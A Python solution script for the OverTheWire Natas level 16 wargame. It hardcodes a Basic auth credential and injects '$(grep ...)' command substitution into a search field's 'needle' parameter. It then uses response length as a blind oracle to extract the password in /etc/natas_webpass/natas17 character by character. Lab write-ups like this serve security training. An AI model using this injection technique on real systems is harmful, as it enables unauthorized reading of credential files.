import requests
import string

headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}

url = 'http://natas16.natas.labs.overthewire.org/'

password = ''

#from natas 15 we will assume that the password is 32 characters long

length = 32

# we have to insert a . before each character that we discover in order for this to work
# essentially, we are testing the following:
# 'grep ^{}'.format(a)
# 'grep ^.{}'.format(a)
# 'grep ^..{}'.format(a)
# etc, until all 32 characters have been found

offset = '' 
characters = list(string.ascii_letters+string.digits)

#first lets try to see if we can find which characters are in the password

#valid_characters = list() #empty list to add valid characters too

#for c in characters:
#        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c)
#        r = requests.get(url+payload, headers=headers)
#        if len(r.text) > 1105:
#                valid_characters.append(c)

#print('there are {} valid characters: '.format(len(valid_characters)))

#for v in valid_characters:
#        print(v, end='')

#print('\n')

for p in range(0,length): #loop for each character in the password
    for c in characters: #loop for each possible character as defined above (letters + digits)
        payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(offset, c)

        r = requests.get(url+payload, headers=headers)
        if len(r.text) == 1105:
            password += c
            print(c)

    offset += '.'

print('password is: '+password)